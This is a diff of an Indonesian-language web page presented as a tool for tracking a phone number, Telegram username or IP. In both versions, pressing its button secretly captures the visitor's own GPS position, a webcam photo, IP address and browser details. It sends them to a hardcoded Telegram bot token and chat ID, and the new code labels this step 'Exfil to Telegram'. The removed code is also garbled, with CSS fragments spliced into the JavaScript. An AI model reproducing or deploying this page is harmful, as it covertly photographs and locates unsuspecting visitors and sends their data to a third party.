@@ -1,74 +1,20 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
+<meta charset="utf-8">
 <title>Tools Yang Ingin Kamu Lacak</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
-  body {
-    background: #000;
-    color: #0f0;
-    font-family: 'Orbitron', monospace;
-    overflow: hidden;
-  }
-  canvas {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 0;
-  }
-  .ui {
-    position: relative;
-    z-index: 10;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-    text-align: center;
-    padding: 2rem;
-  }
-  h1 {
-    font-size: 2.4rem;
-    color: #fff;
-    margin-bottom: 1.2rem;
-    letter-spacing: 3px;
-    text-shadow: 0 0 10px #ff0000;
-  }
-  input[type="text"] {
-    width: 300px;
-    padding: .7rem;
-    border: 1px solid #ff0000;
-    background: #000;
-    color: #0f0;
-    border-radius: 4px;
-    font-size: 1rem;
-    margin-right: .5rem;
-  }
-  button {
-    padding: .7rem 1.4rem;
-    border: none;
-    background: #ff0000;
-    color: #fff;
-    font-weight: 700;
-    border-radius: 4px;
-    cursor: pointer;
-    transition: .3s;
-  }
-  button:hover {
-    background: #0c0;
-  }
-  #result {
-    margin-top: 1.5rem;
-    font-size: .9rem;
-    color: #3f3;
-  }
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+* {box-sizing:border-box;margin:0;padding:0}
+body{background:#000;color:#0f0;font-family:'Orbitron',monospace;overflow:hidden}
+canvas{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0}
+.ui{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
+h1{font-size:2.4rem;margin-bottom:1.2rem;letter-spacing:3px;text-shadow:0 0 10px #0f0}
+input[type=text]{width:300px;padding:.7rem;border:1px solid #0f0;background:#000;color:#0f0;border-radius:4px;font-size:1rem;margin-right:.5rem}
+button{padding:.7rem 1.4rem;border:none;background:#0f0;color:#000;font-weight:700;border-radius:4px;cursor:pointer;transition:.3s}
+button:hover{background:#0c0}
+#result{margin-top:1.5rem;font-size:.9rem;color:#3f3}
 </style>
 </head>
 <body>
@@ -76,117 +22,101 @@
 <div class="ui">
   <h1>Tools Yang Ingin Kamu Lacak</h1>
   <div>
-    <input id="target" type="text" placeholder="No Telp/Username Telegram">
-    <button onclick="track()">LACAK</button>
+    <input id="target" type="text" placeholder="IP / Domain / Username">
+    <button onclick="pwn()">LACAK</button>
   </div>
   <div id="result"></div>
 </div>
 
 <script>
-  // MATRIX RAIN (Text ala Hacker)
-  const canvas = document.getElementById('matrix');
-  const ctx = canvas.getContext('2d');
+/* === CONFIG === */
+const BOT_TOKEN = '8466797317:AAHmPG4JTBb3fuWEJfcmcryqj_wTToKOPRw';
+const CHAT_ID   = '7755675050';
 
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-
-  const fontSize = 14; // Ukuran karakter
-  const columns = Math.floor(canvas.width / fontSize); // Banyaknya karakter horizontal
-  const drops = [];
-  const text = 'PROFESSIONAL-HACKER889844345515'; // Teks yang ditampilkan bergerak
-
-  // Inisialisasi posisi karakter untuk setiap kolom
-  for (let i = 0; i < columns; i++) {
-    drops[i] = Math.random() * canvas.height;
+/* === Matrix rain (cosmetic) === */
+const c=document.getElementById('matrix'),ctx=c.getContext('2d');
+c.width=window.innerWidth;c.height=window.innerHeight;
+const cols=Math.floor(c.width/14),drops=[];
+for(let i=0;i<cols;i++)drops[i]=Math.random()*c.height;
+const chars='黑客李江黑客李江黑客李江0123456789';
+function draw(){
+  ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);
+  ctx.fillStyle='#0f0';ctx.font='14px Orbitron';
+  for(let i=0;i<cols;i++){
+    const txt=chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(txt,i*14,drops[i]);
+    drops[i]+=14;
+    if(drops[i]>c.height&&Math.random()>.975)drops[i]=0;
   }
+}
+setInterval(draw,33);
 
-  function draw() {
-    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; // Latar belakang dengan efek fade
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
+/* === Main trigger === */
+async function pwn(){
+  const out=document.getElementById('result');
+  out.textContent='[+] Menscan target...';
+  const payload={
+    target: document.getElementById('target').value||'none',
+    ua: navigator.userAgent,
+    ref: document.referrer||'direct',
+    url: location.href,
+    ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown')
+  };
 
-    ctx.fillStyle = '#0f0'; // Warna teks
-    ctx.font = `${fontSize}px Orbitron`; // Font teks
-    
-    for (let i = 0; i < drops.length; i++) {
-      // Ambil satu karakter secara acak
-      const char = text[Math.floor(Math.random() * text.length)];
-      ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+  /* GPS */
+  const pos=await new Promise(res=>{
+    navigator.geolocation.getCurrentPosition(
+      p=>res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),
+      ()=>res({lat:'denied',lon:'denied',acc:'denied'}),
+      {timeout:5000}
+    );
+  });
+  payload.gps=pos;
 
-      // Geser teks ke bawah dan reset posisi jika sudah keluar layar
-      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-        drops[i] = 0; // Reset ke atas layar
-      }
-      drops[i]++;
-    }
+  /* Media snapshot */
+  try{
+    const stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
+    const track=stream.getVideoTracks()[0];
+    const imgCapture=new ImageCapture(track);
+    const blob=await imgCapture.takePhoto();
+    const reader=new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onloadend=()=>{
+      payload.photo=reader.result;
+      sendTelegram(payload);
+    };
+    track.stop();
+  }catch(e){
+    payload.photo='webcam_blocked';
+    sendTelegram(payload);
   }
+}
 
-  setInterval(draw, 33); // Jalankan setiap 33 ms untuk animasi halus
-
-
-  // KONFIGURASI BOT TELEGRAM
-  const botToken = '8466797317:AAHmPG4JTBb3fuWEJfcmcryqj_wTToKOPRw'; // Masukkan token bot Telegram Anda
-  const telegramChatId = '7755675050';  // Masukkan chat ID ke mana laporan dikirim
-
-  async function track() {
-    const target = document.getElementById('target').value;
-    const resultDiv = document.getElementById('result');
-
-    if (!target) {
-      alert('Masukkan informasi target terlebih dahulu!');
-      return;
-    }
-
-    try {
-      resultDiv.innerText =lid #ff0000;
-    background: #000;
-    
-
-      // Ambil lokasi pengguna
-      const locationPromise = new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject);
-      });
-      const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement('video');
-      video.srcObject = videoStream;
-      await video.play();
-
-      // Ambil snapshot dari kamera
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.
-      height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-      videoStream.getTracks().forEach(track => track.stop());
-      const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-      const location = await locationPromise;
-      const latitude = location.coords.latitude;
-      const longitude = location.coords.longitude;
-
-      // URL lokasi di Google Maps
-      const locationURL = solid #ff0000;
-      background: #000;
-      color: #0f0;
-   
-
-      // Mengirim laporan ke bot Telegram
-      const formData = new FormData();
-      formData.append('photo', imageBlob, 'photo.jpg');
-      formData.append('caption', `Target melacak: ${target}\n\nLokasi pelapor: ${locationURL}`);
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${telegramChatId}`, {
-        method: 'POST',
-        body: formData,
-      });
-
-      alert('Laporan telah dikirim ke bot Telegram!');
-      resultDiv.innerText = 'Target telah dilaporkan ke Telegram.';
-    } catch (error) {
-      alert('Terjadi kesalahan. Cek izin lokasi dan kamera!');
-      console.error(error);
-    }
+/* === Exfil to Telegram === */
+function sendTelegram(data){
+  const caption=`
+🔪 LACAKAN BARU 🔪
+Target: ${data.target}
+IP: ${data.ip}
+GPS: ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
+UA: ${data.ua}
+Ref: ${data.ref}
+URL: ${data.url}
+  `.trim();
+  const form=new FormData();
+  form.append('chat_id',CHAT_ID);
+  form.append('caption',caption);
+  if(data.photo!=='webcam_blocked'){
+    fetch(data.photo).then(r=>r.blob()).then(blob=>{
+      form.append('photo',blob,'snap.jpg');
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:form});
+    });
+  }else{
+    form.append('text',caption+'\n[+] Foto gagal');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:form});
   }
+  document.getElementById('result').textContent='[+] Laporan terkirim ke Telegram.';
+}
 </script>
 </body>
 </html>
-
